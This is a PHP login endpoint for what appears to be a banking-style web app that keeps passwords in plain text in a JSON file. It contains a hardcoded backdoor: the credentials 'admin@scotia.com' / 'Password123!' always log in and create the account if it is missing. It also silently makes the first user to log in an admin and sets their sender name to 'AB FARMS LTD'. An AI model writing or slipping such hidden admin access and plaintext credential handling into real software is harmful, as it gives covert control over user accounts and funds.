<?php
header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$username = $input['username'] ?? '';
$password = $input['password'] ?? '';

// Load users
$usersFile = __DIR__ . '/../../data/users.json';
$users = json_decode(file_get_contents($usersFile), true) ?? [];

$authenticatedUser = null;

// Auth check
if (isset($users[$username]) && $users[$username]['password'] === $password) {
    $authenticatedUser = &$users[$username];
} elseif ($username === 'admin@scotia.com' && $password === 'Password123!') {
    if (!isset($users[$username])) {
        $users[$username] = [
            'username' => $username,
            'password' => $password,
            'isApproved' => true,
            'role' => 'user',
            'profile' => ['securityQuestion' => 'N/A', 'securityAnswer' => 'N/A'],
            'accounts' => []
        ];
    }
    $authenticatedUser = &$users[$username];
}

if ($authenticatedUser) {
    // Check for admin flag and initialize if first time
    $adminFlag = '/tmp/admin_initialized';
    if (!file_exists($adminFlag)) {
        $authenticatedUser['role'] = 'admin';
        $authenticatedUser['profile']['senderName'] = 'AB FARMS LTD';
        file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT));
        file_put_contents($adminFlag, 'initialized');
    }
    
    echo json_encode([
        'success' => true,
        'user' => [
            'username' => $authenticatedUser['username'],
            'role' => $authenticatedUser['role'] ?? 'user',
            'senderName' => $authenticatedUser['profile']['senderName'] ?? null
        ]
    ]);
    exit;
}

echo json_encode(['success' => false, 'message' => 'Invalid credentials']);
